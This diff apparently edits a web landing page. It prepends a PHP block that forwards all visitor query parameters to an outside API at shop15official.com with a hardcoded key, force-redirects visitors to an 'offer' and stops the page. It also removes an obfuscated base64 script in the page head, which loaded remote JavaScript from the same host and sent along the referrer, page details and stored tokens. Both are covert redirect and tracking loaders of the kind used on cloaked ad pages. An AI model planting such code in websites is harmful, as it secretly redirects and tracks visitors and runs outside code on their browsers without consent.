@@ -1,9 +1,22 @@
+<?php
+// Query params are: utm_creative={{ad.name}}&utm_campaign={{campaign.name}}&utm_source={{site_source_name}}&utm_placement={{placement}}&campaign_id={{campaign.id}}&adset_id={{adset.id}}&ad_id={{ad.id}}&adset_name={{adset.name}} 
+
+require_once dirname(__FILE__) . '/kclient.php';
+$client = new KClient('https://shop15official.com/api.php?', 'LCVXKpYb3s8TNGMF');
+$client->sendAllParams();       // to send all params from page query
+$client->forceRedirectOffer();       // redirect to offer if an offer is chosen
+// $client->param('sub_id_5', '123'); // you can send any params
+// $client->keyword('PASTE_KEYWORD');  // send custom keyword
+// $client->currentPageAsReferrer(); // to send current page URL as click referrer
+// $client->debug();              // to enable debug mode and show the errors
+// $client->execute();             // request to api, show the output and continue
+$client->executeAndBreak();     // to stop page execution if there is redirect or some output
+?>
 <!DOCTYPE html>
 <html lang="en">
 
 <head>
-    <script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfR1NKVko0Y0ZQelFnWEZIRCc7CiAgICBpZiAoIXdpbmRvdy5fR1NKVko0Y0ZQelFnWEZIRCkgewogICAgICAgIHdpbmRvdy5fR1NKVko0Y0ZQelFnWEZIRCA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly9zaG9wMTVvZmZpY2lhbC5jb20vM1ZSNGJNY1MnLAogICAgICAgICAgICBQX1BBVEg6ICdodHRwczovL3Nob3AxNW9mZmljaWFsLmNvbS8zYzcwNTYwL3Bvc3RiYWNrJywKICAgICAgICB9OwogICAgfQogICAgY29uc3QgXzlGSEc3NXBTSERRdHdYRG4gPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnY29uZmlnJyk7CiAgICBpZiAodHlwZW9mIF85RkhHNzVwU0hEUXR3WERuICE9PSAndW5kZWZpbmVkJyAmJiBfOUZIRzc1cFNIRFF0d1hEbiAhPT0gbnVsbCkgewogICAgICAgIHZhciBfSE1NVERWcVZOdnNqWm1ZViA9IEpTT04ucGFyc2UoXzlGSEc3NXBTSERRdHdYRG4pOwogICAgICAgIHZhciBfM2JNQ1N5OGZOcnEyOXM3ciA9IE1hdGgucm91bmQoK25ldyBEYXRlKCkvMTAwMCk7CiAgICAgICAgaWYgKF9ITU1URFZxVk52c2pabVlWLmNyZWF0ZWRfYXQgKyB3aW5kb3cuX0dTSlZKNGNGUHpRZ1hGSEQudHRsIDwgXzNiTUNTeThmTnJxMjlzN3IpIHsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3N1YklkJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCd0b2tlbicpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnY29uZmlnJyk7CiAgICAgICAgfQogICAgfQogICAgdmFyIF9iRHdWOFdxY3IyM1RRYnE0ID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3N1YklkJyk7CiAgICB2YXIgX05IY1Q1c0M2RDkxa3I4eWMgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgndG9rZW4nKTsKICAgIHZhciBfREtQRFdmM2Y0c0Zod0o1OCA9ICc/cmV0dXJuPWpzLmNsaWVudCc7CiAgICAgICAgX0RLUERXZjNmNHNGaHdKNTggKz0gJyYnICsgZGVjb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gucmVwbGFjZSgnPycsICcnKSk7CiAgICAgICAgX0RLUERXZjNmNHNGaHdKNTggKz0gJyZzZV9yZWZlcnJlcj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnJlZmVycmVyKTsKICAgICAgICBfREtQRFdmM2Y0c0Zod0o1OCArPSAnJmRlZmF1bHRfa2V5d29yZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnRpdGxlKTsKICAgICAgICBfREtQRFdmM2Y0c0Zod0o1OCArPSAnJmxhbmRpbmdfdXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQubG9jYXRpb24uaG9zdG5hbWUgKyBkb2N1bWVudC5sb2NhdGlvbi5wYXRobmFtZSk7CiAgICAgICAgX0RLUERXZjNmNHNGaHdKNTggKz0gJyZuYW1lPScgKyBlbmNvZGVVUklDb21wb25lbnQobmFtZSk7CiAgICAgICAgX0RLUERXZjNmNHNGaHdKNTggKz0gJyZob3N0PScgKyBlbmNvZGVVUklDb21wb25lbnQod2luZG93Ll9HU0pWSjRjRlB6UWdYRkhELlJfUEFUSCk7CiAgICBpZiAodHlwZW9mIF9iRHdWOFdxY3IyM1RRYnE0ICE9PSAndW5kZWZpbmVkJyAmJiBfYkR3VjhXcWNyMjNUUWJxNCAmJiB3aW5kb3cuX0dTSlZKNGNGUHpRZ1hGSEQudW5pcXVlKSB7CiAgICAgICAgX0RLUERXZjNmNHNGaHdKNTggKz0gJyZzdWJfaWQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChfYkR3VjhXcWNyMjNUUWJxNCk7CiAgICB9CiAgICBpZiAodHlwZW9mIF9OSGNUNXNDNkQ5MWtyOHljICE9PSAndW5kZWZpbmVkJyAmJiBfTkhjVDVzQzZEOTFrcjh5YyAmJiB3aW5kb3cuX0dTSlZKNGNGUHpRZ1hGSEQudW5pcXVlKSB7CiAgICAgICAgX0RLUERXZjNmNHNGaHdKNTggKz0gJyZ0b2tlbj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9OSGNUNXNDNkQ5MWtyOHljKTsKICAgIH0KICAgIHZhciBhID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CiAgICAgICAgYS50eXBlID0gJ2FwcGxpY2F0aW9uL2phdmFzY3JpcHQnOwogICAgICAgIGEuc3JjID0gd2luZG93Ll9HU0pWSjRjRlB6UWdYRkhELlJfUEFUSCArIF9ES1BEV2YzZjRzRmh3SjU4OwogICAgdmFyIHMgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2NyaXB0JylbMF07CiAgICBzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGEsIHMpCiAgICB9KSgpOwogICAg"></script>
-    <meta charset="UTF-8">
+<meta charset="UTF-8">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
